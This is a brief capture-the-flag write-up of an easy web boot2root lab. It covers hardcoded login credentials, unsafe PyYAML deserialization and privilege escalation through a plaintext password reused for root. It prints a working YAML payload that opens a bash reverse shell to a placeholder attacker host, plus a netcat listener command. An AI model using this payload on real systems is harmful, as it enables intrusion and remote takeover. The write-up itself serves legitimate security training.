Day 5 | Easy • Web • Boot2root

The assessment began by reviewing the exposed source code of the web application, which revealed the hardcoded credentials dj:dj. After logging in, the Import Playlist functionality was identified. The YAML parser was tested with !!python/tuple and !!python/name:os.system, confirming unsafe PyYAML deserialization. Remote Code Execution (RCE) was achieved using the following payload:

!!python/object/apply:subprocess.Popen
args: [['/bin/bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1']]

A Netcat listener (nc -lvnp 4444) received a reverse shell as the bartender user, allowing retrieval of the user.txt flag from /home/bartender. During enumeration, the /opt/beach-bar/ directory contained three components: webapp, venv, and jukeboxd.

Since the RCE originated from the webapp, the jukeboxd directory was inspected next. Reviewing jukeboxd.py revealed that the application required a --stream-pass argument, suggesting that the password was likely stored in the service configuration. 

For Privilege Escalation, systemctl status jukeboxd.service exposed a plaintext password (Sun**********24!). Since the same password was reused for the root account, su root was used to gain administrative access and retrieve the root.txt flag.
